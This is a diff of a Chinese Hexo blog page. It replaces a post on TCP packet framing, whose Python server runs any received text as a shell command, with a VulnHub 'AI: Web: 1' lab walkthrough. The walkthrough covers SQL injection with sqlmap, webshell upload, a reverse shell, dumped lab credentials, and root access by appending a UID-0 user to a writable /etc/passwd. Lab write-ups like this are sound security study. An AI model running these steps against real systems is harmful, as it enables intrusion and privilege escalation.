@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>解决socket TCP粘包 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="解决socket TCP粘包 | 九世的博客">
+  <title>Vulnhub-web1.0 | 九世的博客</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="Vulnhub-web1.0 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1118,9 +1118,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-解决socket-TCP粘包" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Vulnhub-web1-0" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">解决socket TCP粘包</h1>
+        <h1 class="article-title">Vulnhub-web1.0</h1>
     
     <div class="article-meta">
         
@@ -1129,14 +1129,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">靶场</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-11-16 19:40</time>
+        创建时间:<time class="date" title="更新时间: 2019-10-27 20:52:35">2019-10-27 20:09</time>
         
     </div>
     <div class="article-meta">
@@ -1158,7 +1158,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解题过程"><span class="toc-text">解题过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1173,91 +1173,70 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在socket网络程序中，TCP和UDP分别是面向连接和非面向连接的。因此TCP的socket编程，收发两端（客户端和服务器端）都要有成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小、数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。</p>
-<p>对于UDP，不会使用块的合并优化算法，这样，实际上目前认为，是由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。所以UDP不会出现粘包问题。<br><img src="http://pic.netbian.com/uploads/allimg/181108/220632-15416859924c51.jpg" alt="220632-15416859924c51.jpg"><br>拔剑神曲βios:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34179077&auto=1&height=66"></iframe></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>server端：</p>
-<pre><code>import socket
-import subprocess
-import struct
-import json
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=1369707436&auto=1&height=66"></iframe>
 
-def server(host,port):
-    servers=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    servers.bind((host,port))
-    servers.listen(1)
-    while True:
-        shargs,args=servers.accept()
-        print(&#39;[+] ソースIP:{}&#39;.format(args[0]))
-
-        while True:
-            try:
-                msg=shargs.recv(1024)
-                res=subprocess.Popen(msg.decode(&#39;utf-8&#39;),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-                out_read=res.stdout.read()
-                err_read=res.stderr.read()
-                data_size=len(out_read)+len(err_read) /获取数据长度
-                head_dic={&quot;data_size&quot;:data_size} //打包成json
-                head_json=json.dumps(head_dic) //为str类型
-                head_bytes=head_json.encode(&#39;utf-8&#39;) //报文编码为utf8
-                head_len=len(head_bytes) //报文长度
-                shargs.sendall(struct.pack(&quot;i&quot;,head_len)) //先发送报文长度
-                shargs.sendall(head_bytes) //发送报文
-                shargs.sendall(out_read) //发送真实数据
-                shargs.sendall(err_read)
-            except:
-                pass
-if __name__ == &#39;__main__&#39;:
-    host=&#39;127.0.0.1&#39;
-    port=4448
-    server(host,port)
-</code></pre><p>client段</p>
-<pre><code>import socket
-import struct
-import json
-
-def client(host,port):
-    clients=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    try:
-        clients.connect((host,port))
-        print(&#39;[+] 接続が成功する&#39;)
-    except:
-        print(&#39;[-] 接続失敗&#39;)
-        exit()
-
-    while True:
-        user=input(&#39;コマンドを入力してください:&#39;)
-        if not user:
-            continue
-        clients.sendall(bytes(user,encoding=&#39;utf8&#39;)) 
-
-        head_rec=clients.recv(4) //读取4个字符
-        print(&#39;head_rec&#39;,head_rec) 
-        head_len=struct.unpack(&quot;i&quot;,head_rec)[0] //解开报文第一个字符为16进制（获取长度）
-        print(head_len)
-
-        head_byte=clients.recv(head_len) //读取指定长度的数据
-        print(&#39;head_byte:&#39;,head_byte) 
-        head_json=head_byte.decode(&#39;utf8&#39;) //获取到json并解码为utf8
-        head_dic=json.loads(head_json) //解析josn
-        data_size=head_dic[&quot;data_size&quot;] //得到字节总
-
-        recv_size=0
-        recv_data=b&#39;&#39;
-        while recv_size&lt;data_size: 
-            js=clients.recv(1024) //读取数据
-            print(js)
-            recv_size+=len(js) //字节和返回数据长度加在一起
-            print(recv_size)
-            print(&#39;recv_data:&#39;,recv_data) //b&#39;&#39;+返回数据
-            recv_data+=js
-         print(recv_data.decode(&#39;utf-8&#39;)) //解码为utf-8
-    clients.close()
-
-if __name__ == &#39;__main__&#39;:
-    host=&#39;127.0.0.1&#39;
-    port=4447
-    client(host,port)
-</code></pre><p>转载请声明：转自422926799.github.io</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续做vulnhub的题，这次是web1.0。<br>题目地址：<a href="https://www.vulnhub.com/entry/ai-web-1,353/" target="_blank" rel="noopener">AI: Web: 1 ~ VulnHub</a></p>
+<p><img src="https://s2.ax1x.com/2019/10/27/Ky1uKf.png" alt="Ky1uKf.png"></p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><pre><code>kali:192.168.1.110
+AI-web:192.168.1.106
+</code></pre><p>探测存活的IP</p>
+<pre><code>fping -ag 192.168.1.0/24 &gt; test.txt
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyuHkn.png" alt="KyuHkn.png"></p>
+<p>打开一康<br><img src="https://s2.ax1x.com/2019/10/27/KyuOpV.png" alt="KyuOpV.png"></p>
+<p>端口扫描</p>
+<pre><code>nmap -sC -sV 192.168.1.106
+nmap -p 1-65535 192.168.1.106
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyKPt1.png" alt="KyKPt1.png"></p>
+<p>发现有个robots.txt，并没有开放ssh</p>
+<p>对web进行目录扫描</p>
+<pre><code>python3 dirsearch.py -u http://192.168.1.106/ -e path 
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyKtBQ.png" alt="KyKtBQ.png"></p>
+<p>访问robots.txt<br><img src="https://s2.ax1x.com/2019/10/27/KyKwhq.png" alt="KyKwhq.png"></p>
+<p>两个路径都是403<br><img src="https://s2.ax1x.com/2019/10/27/KyKsjU.png" alt="KyKsjU.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/27/KyKgHJ.png" alt="KyKgHJ.png"><br>robots.txt内容</p>
+<pre><code>User-agent: *
+Disallow: 
+Disallow: /m3diNf0/
+Disallow: /se3reTdir777/uploads/
+</code></pre><p>对/m3diNf0/进行目录爆破</p>
+<pre><code>python3 dirsearch.py -u http://192.168.1.106/m3diNf0/ -e .php
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyMGP1.png" alt="KyMGP1.png"></p>
+<p>打开看发现是phpinfo<br><img src="https://s2.ax1x.com/2019/10/27/KyMtxK.png" alt="KyMtxK.png"></p>
+<p>对/se3reTdir777/进行爆破</p>
+<pre><code>python3 dirsearch.py -u http://192.168.1.106/se3reTdir777/ -e php
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyMOLF.png" alt="KyMOLF.png"></p>
+<p>这两个路径一个是名称一个是ID<br><img src="https://s2.ax1x.com/2019/10/27/KyQFsO.png" alt="KyQFsO.png"></p>
+<p>尝试插入’，发现报错<br><img src="https://s2.ax1x.com/2019/10/27/KyQEee.png" alt="KyQEee.png"></p>
+<p>插入’ #发现返回正常，判断为sql注入<br><img src="https://s2.ax1x.com/2019/10/27/KyQMSP.png" alt="KyQMSP.png"></p>
+<p>sqlmap跑<br><img src="https://s2.ax1x.com/2019/10/27/KyQJoj.png" alt="KyQJoj.png"></p>
+<p>数据都跑完之后，得到以下内容</p>
+<pre><code>systemuser表里的数据
+| 1  | t00r      | RmFrZVVzZXJQYXNzdzByZA==           FakeUserPassw0rd          |
+| 2  | aiweb1pwn | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ==  MyEvilPass_f908sdaf9_sadfasf0sa|
+| 3  | u3er      | TjB0VGhpczBuZUFsczA=  N0tThis0neAls0
+</code></pre><p>执行is-dba，发现非root<br><img src="https://s2.ax1x.com/2019/10/27/KyQwlV.png" alt="KyQwlV.png"></p>
+<p>由于知道物理路径(phpinfo)，尝试–os-shell</p>
+<pre><code>DOCUMENT_ROOT    /home/www/html/web1x443290o2sdf92213
+</code></pre><p>sqlmap给出无写入权限<br><img src="https://s2.ax1x.com/2019/10/27/KyQ4OO.png" alt="KyQ4OO.png"></p>
+<p>尝试upload那个路径,getshell成功</p>
+<pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/Kylihn.png" alt="Kylihn.png"></p>
+<p>访问sqlmap的那个可以上传文件的上传webshell</p>
+<pre><code>http://192.168.1.106/se3reTdir777/uploads/tmpudktt.php
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KylMN9.png" alt="KylMN9.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/27/Kyl191.png" alt="Kyl191.png"></p>
+<p>利用webshell反弹功能，得到一个伪shell<br><img src="https://s2.ax1x.com/2019/10/27/KylaAH.png" alt="KylaAH.png"></p>
+<p>先看了一遍/home目录，发现没啥好用的，然后查了一下/etc/passwd的权限，发现可写<br><img src="https://s2.ax1x.com/2019/10/27/Kylsjf.png" alt="Kylsjf.png"></p>
+<p>使用perl生成加盐的密码</p>
+<pre><code>perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39;
+</code></pre><p>在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中</p>
+<pre><code>echo &quot;tests:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd
+</code></pre><p>由于没看ssh，没法连接上下。而反弹回来的shell不能直接切换用户</p>
+<pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+export TREM=scrreen
+</code></pre><p>执行上面的命令则可以获得一个”真“shell<br><img src="https://s2.ax1x.com/2019/10/27/Ky1A5d.png" alt="Ky1A5d.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/27/Ky1e2t.png" alt="Ky1e2t.png"></p>
+<p>得到flag<br><img src="https://s2.ax1x.com/2019/10/27/Ky1mxP.png" alt="Ky1mxP.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1267,12 +1246,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>解决socket TCP粘包</p>
+    <p><span class="copy-title">文章标题:</span>Vulnhub-web1.0</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-11-16, 19:40:24</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ee45ea9a.html" title="解决socket TCP粘包">http://422926799.github.io/posts/ee45ea9a.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-27, 20:09:44</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-27, 20:52:35</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/1c5edba3.html" title="Vulnhub-web1.0">http://422926799.github.io/posts/1c5edba3.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
